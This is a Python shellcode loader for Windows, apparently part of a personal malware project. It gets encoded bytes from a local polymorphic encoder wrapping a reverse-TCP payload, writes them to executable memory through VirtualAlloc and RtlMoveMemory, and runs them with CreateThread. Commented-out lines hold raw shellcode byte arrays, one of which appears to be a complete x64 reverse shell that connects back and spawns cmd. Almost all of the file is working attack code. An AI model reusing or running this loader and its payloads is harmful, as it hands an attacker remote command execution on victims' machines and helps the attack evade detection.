import ctypes
import subprocess

# RUN SHELLCODE WINDOWS 32b & 64b

# shellcode = b"hed \x0b\x814$\x01\x01\x01\x01H\xb8 shellcoPH\xb8rld fromPH\xb8Hello WoPj\x01Xj\x01_j\x1cZH\x89\xe6\x0f\x05XXXX\xc3"
# shellcode = subprocess.Popen(["cmd", "/C", "polym_win.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0]
# shellcode = subprocess.check_output(["cmd", "/C", "polym_win.exe ./reversetcp.bin"])
# print("P1:")
# print(shellcode)
# shellcode = bytearray(shellcode)
# while(shellcode == "N"):
#     shellcode = str(subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0])

# shellcode = bytes.fromhex(shellcode)
# shellcode = bytearray(shellcode)
# print("P2:")
# print("%02X" % shellcode)
# print(shellcode)

# import struct

# def shellc2bytes(string):
#     bytes = b''
#     for i in string:
#         # bytes += struct.pack("B", ord(i))
#         bytes += ord(i)
#     return bytes     

def get_shellcode():
    
    
    # shellcodestr = '\x4d\x31\xc0\x41\xb1\xf3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x0f\xbb\x70\x17\x03\x1b\x33\xf3\xf3\xf3\xb2\xa2\xb2\xa3\xa1\xa2\xa5\xbb\xc2\x21\x96\xbb\x78\xa1\x93\xbb\x78\xa1\xeb\xbb\x78\xa1\xd3\xbb\x78\x81\xa3\xbb\xfc\x44\xb9\xb9\xbe\xc2\x3a\xbb\xc2\x33\x5f\xcf\x92\x8f\xf1\xdf\xd3\xb2\x32\x3a\xfe\xb2\xf2\x32\x11\x1e\xa1\xb2\xa2\xbb\x78\xa1\xd3\x78\xb1\xcf\xbb\xf2\x23\x78\x73\x7b\xf3\xf3\xf3\xbb\x76\x33\x87\x94\xbb\xf2\x23\xa3\x78\xbb\xeb\xb7\x78\xb3\xd3\xba\xf2\x23\x10\xa5\xbb\x0c\x3a\xb2\x78\xc7\x7b\xbb\xf2\x25\xbe\xc2\x3a\xbb\xc2\x33\x5f\xb2\x32\x3a\xfe\xb2\xf2\x32\xcb\x13\x86\x02\xbf\xf0\xbf\xd7\xfb\xb6\xca\x22\x86\x2b\xab\xb7\x78\xb3\xd7\xba\xf2\x23\x95\xb2\x78\xff\xbb\xb7\x78\xb3\xef\xba\xf2\x23\xb2\x78\xf7\x7b\xbb\xf2\x23\xb2\xab\xb2\xab\xad\xaa\xa9\xb2\xab\xb2\xaa\xb2\xa9\xbb\x70\x1f\xd3\xb2\xa1\x0c\x13\xab\xb2\xaa\xa9\xbb\x78\xe1\x1a\xa4\x0c\x0c\x0c\xae\xba\x4d\x84\x80\xc1\xac\xc0\xc1\xf3\xf3\xb2\xa5\xba\x7a\x15\xbb\x72\x1f\x53\xf2\xf3\xf3\xba\x7a\x16\xba\x4f\xf1\xf3\xe0\x78\xf9\xf3\xf1\xf6\xb2\xa7\xba\x7a\x17\xbf\x7a\x02\xb2\x49\xbf\x84\xd5\xf4\x0c\x26\xbf\x7a\x19\x9b\xf2\xf2\xf3\xf3\xaa\xb2\x49\xda\x73\x98\xf3\x0c\x26\xa3\xa3\xbe\xc2\x3a\xbe\xc2\x33\xbb\x0c\x33\xbb\x7a\x31\xbb\x0c\x33\xbb\x7a\x32\xb2\x49\x19\xfc\x2c\x13\x0c\x26\xbb\x7a\x34\x99\xe3\xb2\xab\xbf\x7a\x11\xbb\x7a\x0a\xb2\x49\x6a\x56\x87\x92\x0c\x26\xbb\x72\x37\xb3\xf1\xf3\xf3\xba\x4b\x90\x9e\x97\xf3\xf3\xf3\xf3\xf3\xb2\xa3\xb2\xa3\xbb\x7a\x11\xa4\xa4\xa4\xbe\xc2\x33\x99\xfe\xaa\xb2\xa3\x11\x0f\x95\x34\xb7\xd7\xa7\xf2\xf2\xbb\x7e\xb7\xd7\xeb\x35\xf3\x9b\xbb\x7a\x15\xa5\xa3\xb2\xa3\xb2\xa3\xb2\xa3\xba\x0c\x33\xb2\xa3\xba\x0c\x3b\xbe\x7a\x32\xbf\x7a\x32\xb2\x49\x8a\x3f\xcc\x75\x0c\x26\xbb\xc2\x21\xbb\x0c\x39\x78\xfd\xb2\x49\xfb\x74\xee\x93\x0c\x26\x48\x03\x46\x51\xa5\xb2\x49\x55\x66\x4e\x6e\x0c\x26\xbb\x70\x37\xdb\xcf\xf5\x8f\xf9\x73\x08\x13\x86\xf6\x48\xb4\xe0\x81\x9c\x99\xf3\xaa\xb2\x7a\x29\x0c\x26'
    shellcodestr = "N"
    while(shellcodestr == "N"):
        # shellcodestr = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], text=True)
        shellcodestr = subprocess.check_output(["cmd", "/C", 'C:/Users/malwa/Desktop/Game/shpol.exe'], text=True)
        
    print("Popen:")
    print(shellcodestr)
    shellcodestr = shellcodestr.replace('\\x', ' ')
    return bytearray(bytes.fromhex(shellcodestr))
#-----------------
    # shellcode = subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0]
    # print("Popen:")
    # print(shellcodestr)
    # sbytes = bytes(shellcode, 'utf-8')
    # shellcode = shellcodestr.encode('utf-8')
    # print("P1:")
    # print(shellcode)
    # shellcode = shellc2bytes(shellcode)
    # print("P1:")
    # print(sbytes)
    
    # return shellcode

    # return bytearray(   b'\xDA\xCB\x54\x41\x5C\x48\xBE\x7F\xC8\xA7\x55\x1A\x90\x75\x72\x66\x41\x81\xE4\xE0\xF8\x4D\x31\xFF\x41\xB7\x3A\x49\x0F\xAE\x04\x24\x4D\x8B\x44\x24\x08\x49\xFF\xCF\x4B\x31\x74\xF8\x32\x4D\x85\xFF\x75\xF3\x83\x80\x24\xB1\xEA\x78\xB5\x72\x7F\xC8\xE6\x04\x5B\xC0\x27\x23\x29\x80\x96\x87\x7F\xD8\xFE\x20\x1F\x80\x2C\x07\x02\xD8\xFE\x20\x5F\x80\x2C\x27\x4A\xD8\x7A\xC5\x35\x82\xEA\x64\xD3\xD8\x44\xB2\xD3\xF4\xC6\x29\x18\xBC\x55\x33\xBE\x01\xAA\x14\x1B\x51\x97\x9F\x2D\x89\xF6\x1D\x91\xC2\x55\xF9\x3D\xF4\xEF\x54\xCA\x1B\xF5\xFA\x7F\xC8\xA7\x1D\x9F\x50\x01\x15\x37\xC9\x77\x05\x91\xD8\x6D\x36\xF4\x88\x87\x1C\x1B\x40\x96\x24\x37\x37\x6E\x14\x91\xA4\xFD\x3A\x7E\x1E\xEA\x64\xD3\xD8\x44\xB2\xD3\x89\x66\x9C\x17\xD1\x74\xB3\x47\x28\xD2\xA4\x56\x93\x39\x56\x77\x8D\x9E\x84\x6F\x48\x2D\x36\xF4\x88\x83\x1C\x1B\x40\x13\x33\xF4\xC4\xEF\x11\x91\xD0\x69\x3B\x7E\x18\xE6\xDE\x1E\x18\x3D\x73\xAF\x89\xFF\x14\x42\xCE\x2C\x28\x3E\x90\xE6\x0C\x5B\xCA\x3D\xF1\x93\xE8\xE6\x07\xE5\x70\x2D\x33\x26\x92\xEF\xDE\x08\x79\x22\x8D\x80\x37\xFA\x1C\xA4\xE7\x06\x40\x20\xFB\x95\x55\x1A\xD1\x23\x3B\xF6\x2E\xEF\xD4\xF6\x30\x74\x72\x7F\x81\x2E\xB0\x53\x2C\x77\x72\x6C\x43\xAD\x55\x18\x95\x34\x26\x36\x41\x43\x19\x93\x61\x34\xC8\x33\xBF\x81\x52\xE5\x45\x39\xFB\x95\xA0\xA6\x54\x1A\x90\x2C\x33\xC5\xE1\x27\x3E\x1A\x6F\xA0\x22\x2F\x85\x96\x9C\x57\xA1\xB5\x3A\x80\x08\xEF\xDC\xD8\xD8\x8A\xB2\x37\x41\x66\x14\xA0\x7A\x7A\xAD\x9F\x37\x72\x1D\x93\x57\x1F\x62\x3E\x90\xEB\xDC\xF8\xD8\xFC\x8B\x3E\x72\x3E\xF0\x6E\xF1\x8A\xA7\x37\x49\x63\x15\x18\x90\x75\x3B\xC7\xAB\xCA\x31\x1A\x90\x75\x72\x7F\x89\xF7\x14\x4A\xD8\xFC\x90\x28\x9F\xF0\x18\x2B\x50\x1F\x7F\x26\x89\xF7\xB7\xE6\xF6\xB2\x36\x5B\x9C\xA6\x54\x52\x1D\x31\x56\x67\x0E\xA7\x3D\x52\x19\x93\x24\x2F\x89\xF7\x14\x4A\xD1\x25\x3B\x80\x08\xE6\x05\x53\x6F\xBD\x3F\xF6\x09\xEB\xDC\xDB\xD1\xCF\x0B\xB3\xF7\x21\xAA\xCF\xD8\x44\xA0\x37\x37\x6D\xDE\x14\xD1\xCF\x7A\xF8\xD5\xC7\xAA\xCF\x2B\x85\xC7\xDD\x9E\xE6\xEF\xBC\x05\xC8\xEF\x80\x1D\xEF\xD6\xDE\xB8\x49\x74\x03\xC2\x27\xAE\xFA\xE5\x70\xC9\x38\xDB\xD5\x3A\x70\x90\x2C\x33\xF6\x12\x58\x80\x82\xDB\x55\xA4')
    # return bytearray(b'\x4d\x31\xc0\x41\xb1\xf3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x0f\xbb\x70\x17\x03\x1b\x33\xf3\xf3\xf3\xb2\xa2\xb2\xa3\xa1\xa2\xa5\xbb\xc2\x21\x96\xbb\x78\xa1\x93\xbb\x78\xa1\xeb\xbb\x78\xa1\xd3\xbb\x78\x81\xa3\xbb\xfc\x44\xb9\xb9\xbe\xc2\x3a\xbb\xc2\x33\x5f\xcf\x92\x8f\xf1\xdf\xd3\xb2\x32\x3a\xfe\xb2\xf2\x32\x11\x1e\xa1\xb2\xa2\xbb\x78\xa1\xd3\x78\xb1\xcf\xbb\xf2\x23\x78\x73\x7b\xf3\xf3\xf3\xbb\x76\x33\x87\x94\xbb\xf2\x23\xa3\x78\xbb\xeb\xb7\x78\xb3\xd3\xba\xf2\x23\x10\xa5\xbb\x0c\x3a\xb2\x78\xc7\x7b\xbb\xf2\x25\xbe\xc2\x3a\xbb\xc2\x33\x5f\xb2\x32\x3a\xfe\xb2\xf2\x32\xcb\x13\x86\x02\xbf\xf0\xbf\xd7\xfb\xb6\xca\x22\x86\x2b\xab\xb7\x78\xb3\xd7\xba\xf2\x23\x95\xb2\x78\xff\xbb\xb7\x78\xb3\xef\xba\xf2\x23\xb2\x78\xf7\x7b\xbb\xf2\x23\xb2\xab\xb2\xab\xad\xaa\xa9\xb2\xab\xb2\xaa\xb2\xa9\xbb\x70\x1f\xd3\xb2\xa1\x0c\x13\xab\xb2\xaa\xa9\xbb\x78\xe1\x1a\xa4\x0c\x0c\x0c\xae\xba\x4d\x84\x80\xc1\xac\xc0\xc1\xf3\xf3\xb2\xa5\xba\x7a\x15\xbb\x72\x1f\x53\xf2\xf3\xf3\xba\x7a\x16\xba\x4f\xf1\xf3\xe0\x78\xf9\xf3\xf1\xf6\xb2\xa7\xba\x7a\x17\xbf\x7a\x02\xb2\x49\xbf\x84\xd5\xf4\x0c\x26\xbf\x7a\x19\x9b\xf2\xf2\xf3\xf3\xaa\xb2\x49\xda\x73\x98\xf3\x0c\x26\xa3\xa3\xbe\xc2\x3a\xbe\xc2\x33\xbb\x0c\x33\xbb\x7a\x31\xbb\x0c\x33\xbb\x7a\x32\xb2\x49\x19\xfc\x2c\x13\x0c\x26\xbb\x7a\x34\x99\xe3\xb2\xab\xbf\x7a\x11\xbb\x7a\x0a\xb2\x49\x6a\x56\x87\x92\x0c\x26\xbb\x72\x37\xb3\xf1\xf3\xf3\xba\x4b\x90\x9e\x97\xf3\xf3\xf3\xf3\xf3\xb2\xa3\xb2\xa3\xbb\x7a\x11\xa4\xa4\xa4\xbe\xc2\x33\x99\xfe\xaa\xb2\xa3\x11\x0f\x95\x34\xb7\xd7\xa7\xf2\xf2\xbb\x7e\xb7\xd7\xeb\x35\xf3\x9b\xbb\x7a\x15\xa5\xa3\xb2\xa3\xb2\xa3\xb2\xa3\xba\x0c\x33\xb2\xa3\xba\x0c\x3b\xbe\x7a\x32\xbf\x7a\x32\xb2\x49\x8a\x3f\xcc\x75\x0c\x26\xbb\xc2\x21\xbb\x0c\x39\x78\xfd\xb2\x49\xfb\x74\xee\x93\x0c\x26\x48\x03\x46\x51\xa5\xb2\x49\x55\x66\x4e\x6e\x0c\x26\xbb\x70\x37\xdb\xcf\xf5\x8f\xf9\x73\x08\x13\x86\xf6\x48\xb4\xe0\x81\x9c\x99\xf3\xaa\xb2\x7a\x29\x0c\x26')
#  return bytearray(b'\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x49\xBE\x77\x73\x32\x5F\x33\x32\x00\x00\x41\x56\x49\x89\xE6\x48\x81\xEC\xA0\x01\x00\x00\x49\x89\xE5\x49\xBC\x02\x00\x13\x8B\x0A\x00\x02\x05\x41\x54\x49\x89\xE4\x4C\x89\xF1\x41\xBA\x4C\x77\x26\x07\xFF\xD5\x4C\x89\xEA\x68\x01\x01\x00\x00\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5\x50\x50\x4D\x31\xC9\x4D\x31\xC0\x48\xFF\xC0\x48\x89\xC2\x48\xFF\xC0\x48\x89\xC1\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x6A\x10\x41\x58\x4C\x89\xE2\x48\x89\xF9\x41\xBA\x99\xA5\x74\x61\xFF\xD5\x48\x81\xC4\x40\x02\x00\x00\x49\xB8\x63\x6D\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xE2\x57\x57\x57\x4D\x31\xC0\x6A\x0D\x59\x41\x50\xE2\xFC\x66\xC7\x44\x24\x54\x01\x01\x48\x8D\x44\x24\x18\xC6\x00\x68\x48\x89\xE6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xFF\xC0\x41\x50\x49\xFF\xC8\x4D\x89\xC1\x4C\x89\xC1\x41\xBA\x79\xCC\x3F\x86\xFF\xD5\x48\x31\xD2\x48\xFF\xCA\x8B\x0E\x41\xBA\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5')


def runshell():
    # shellcode = subprocess.check_output(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
    
    # shellcode = bytearray(shellcode)
    shellcode = get_shellcode()
    # print("P2:")
    # print(shellcode)
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode)),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))
    
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                        buf,
                                        ctypes.c_int(len(shellcode)))
    
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.c_int(ptr),
                                            ctypes.c_int(0),
                                            ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
    
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    
def runshell_64():
    shellcode = get_shellcode()
    # print("Shellcode:")
    # print(shellcode)
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 

    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    
def run_exec():
    subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"])
    
if __name__ == "__main__":
    runshell_64()
    